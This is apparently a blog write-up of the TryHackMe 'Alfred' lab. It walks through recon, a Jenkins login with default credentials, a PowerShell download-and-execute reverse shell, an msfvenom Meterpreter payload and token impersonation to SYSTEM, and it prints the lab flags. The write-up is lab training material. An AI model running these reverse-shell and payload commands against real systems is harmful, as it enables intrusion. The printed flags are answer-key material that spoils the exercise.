---
layout: post
title: Alfred
subtitle: TryHackMe Writeup - Alfred
description: A step-by-step guide to rooting the Alfred machine on TryHackMe, inspired by Mr. Robot.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/953f1e4a27c7e04130b824ec1bc8e159.png
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/953f1e4a27c7e04130b824ec1bc8e159.png
category: tryhackme
tags:
  - TryHackMe
  - Metasploit
  - Privilege Escalation
  - Web Exploitation
author: Mustafa Altayeb
date: 2025-08-10 00:00
paginate: true

---

# Alfred - TryHackMe Writeup

[Alfred](https://tryhackme.com/room/alfred) is a Mr. Robot-themed Windows machine on TryHackMe. This writeup details the process of gaining initial access using a web dashboard exploit, establishing a reverse shell with Metasploit, and escalating privileges through token impersonation to achieve Administrator access.

---

![Alfred Machine](https://i.imgur.com/OwWppVP.png)

## Objectives
1. Gain initial access to the Windows machine via a vulnerable web application.
2. Establish a reverse shell using Metasploit.
3. Escalate privileges by exploiting Windows token impersonation.

---

## Reconnaissance

### Nmap Scan
Begin with an Nmap scan to identify open ports and services:
```bash
nmap -Pn -sCV -T5 10.10.96.249
```

**Results**:
```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  tcpwrapped
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2025-08-12T19:20:28
|_Not valid after:  2026-02-11T19:20:28
|_ssl-date: 2025-08-13T19:26:07+00:00; -1s from scanner time.
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
```

**Key Findings**:
- **Port 80**: Microsoft IIS web server.
- **Port 8080**: Jetty 9.4.z-SNAPSHOT hosting a Jenkins web interface.
- **Port 3389**: RDP is enabled.

### Web Enumeration
- **Port 80**: Displays a basic Microsoft IIS page.
![](/assets/TryHackMeRoomsImage/Alfred/image.png)
- **Port 8080**: Reveals a Jenkins web dashboard.
![](/assets/TryHackMeRoomsImage/Alfred/image2.png)
  - Default credentials for Jenkins are often `admin:admin`. The TryHackMe interface indicates both username and password are five characters long (based on asterisks in the login form). Testing `admin:admin` grants access.

---

## Initial Access

After logging into the Jenkins dashboard, follow these steps to gain a reverse shell:

1. Navigate to the **Project** section in the Jenkins dashboard:
   ![](/assets/TryHackMeRoomsImage/Alfred/image2.png)

2. Click on **Configure** to access a section where commands can be executed:
   ![](/assets/TryHackMeRoomsImage/Alfred/image3.png)

3. Use the [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script to establish a reverse shell:
   - Download the script locally:
     ```bash
     nano Invoke-PowerShellTcp.ps1
     ls
     install.sh  Invoke-PowerShellTcp.ps1
     ```
   - Host the script on a Python web server:
     ```bash
     python3 -m http.server 4444
     ```
   - Set up a Netcat listener:
     ```bash
     nc -nlvp 9999
     ```

4. In the Jenkins configuration, add the following command to download and execute the PowerShell script:
   ```powershell
   powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.145.45:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.145.45 -Port 9999
   ```
   ![](/assets/TryHackMeRoomsImage/Alfred/image4.png)

5. Save the configuration and click **Build Now** to execute the command:
   ![](/assets/TryHackMeRoomsImage/Alfred/image5.png)

6. Check the Python web server for a GET request:
   ```
   python3 -m http.server 4444
   Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
   10.10.195.189 - - [14/Aug/2025 15:30:32] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1"
   ```

7. The Netcat listener receives a reverse shell:
   ```
   nc -nlvp 9999
   listening on [any] 9999 ...
   connect to [10.11.145.45] from (UNKNOWN) [10.10.195.189] 49214
   Windows PowerShell running as user bruce on ALFRED
   Copyright (C) 2015 Microsoft Corporation. All rights reserved.

   PS C:\Program Files (x86)\Jenkins\workspace\project>
   ```

### User Flag
Navigate to the `bruce` user’s desktop to retrieve the user flag:
```
PS C:\Users\bruce\Desktop> cat user.txt
79007a09481963edf2e1321abd9ae2a0
```

---

## Switching to a Meterpreter Shell

To facilitate privilege escalation, switch to a Meterpreter shell using Metasploit:

1. Generate a reverse shell executable:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.145.45 LPORT=6060 -f exe -o shell.exe
   ```

2. Host the executable on a Python web server:
   ```bash
   python3 -m http.server 9999
   ```

3. Download the executable to the target machine:
   ```
   PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.11.145.45:9999/shell.exe','shell.exe')"
   PS C:\Users\bruce\Desktop> dir

   Directory: C:\Users\bruce\Desktop

   Mode                LastWriteTime     Length Name
   ----                -------------     ------ ----
   -a---         8/14/2025   8:49 PM      73802 shell.exe
   -a---        10/25/2019  11:22 PM         32 user.txt
   ```

4. Set up a Metasploit multi-handler:
   ```
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
   msf6 exploit(multi/handler) > set LHOST 10.11.145.45
   msf6 exploit(multi/handler) > set LPORT 6060
   msf6 exploit(multi/handler) > run
   ```

5. Execute the shell on the target:
   ```
   PS C:\Users\bruce\Desktop> Start-Process shell.exe
   ```

6. A Meterpreter session is established:
   ```
   [*] Started reverse TCP handler on 10.11.145.45:6060
   [*] Sending stage (175686 bytes) to 10.10.195.189
   [*] Meterpreter session 1 opened (10.11.145.45:6060 -> 10.10.195.189:49214)
   meterpreter > dir
   Listing: C:\Users\bruce\Desktop
   ===============================
   Mode              Size   Type  Last modified              Name
   ----              ----   ----  -------------              ----
   100666/rw-rw-rw-  282    fil   2019-10-25 16:51:28 -0400  desktop.ini
   100777/rwxrwxrwx  73802  fil   2025-08-14 15:49:16 -0400  shell.exe
   100666/rw-rw-rw-  32     fil   2019-10-25 18:22:36 -0400  user.txt
   ```

---

## Privilege Escalation

### Token Impersonation with Incognito
Load the `incognito` extension in Meterpreter to impersonate user tokens:
```
meterpreter > load incognito
Loading extension incognito...Success.
```

List available delegation tokens:
```
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available
```

Impersonate the `BUILTIN\Administrators` token:
```
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

Verify SYSTEM-level privileges by checking running processes:
```
meterpreter > ps
Process List
============
 PID   PPID  Name              Arch  Session  User                        Path
 ---   ----  ----              ----  -------  ----                        ----
 0     0     [System Process]
 4     0     System            x64   0
 668   580   services.exe      x64   0        NT AUTHORITY\SYSTEM         C:\Windows\system32\services.exe
```

**Result**: Successfully escalated to SYSTEM privileges by impersonating the `BUILTIN\Administrators` token.

### Root Flag
Navigate to the Administrator’s desktop to retrieve the root flag:
```
meterpreter > cd C:\Users\Administrator\Desktop
meterpreter > cat root.txt
dff0f748678f280250f25a45b8046b4a
```

---

## Summary
- **Initial Access**: Exploited a vulnerable Jenkins dashboard on port 8080 using default credentials (`admin:admin`). Executed a PowerShell reverse shell via the project configuration.
- **Shell Upgrade**: Switched to a Meterpreter shell for enhanced functionality using Metasploit’s `multi/handler`.
- **Privilege Escalation**: Used the `incognito` extension to impersonate the `BUILTIN\Administrators` token, achieving SYSTEM-level access.
- **Flags Captured**: Retrieved the user flag (`79007a09481963edf2e1321abd9ae2a0`) from `bruce`’s desktop and the root flag (`dff0f748678f280250f25a45b8046b4a`) From C:\Windows\system32\config.

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style='border:none;'></iframe>

Follow me through these links
---
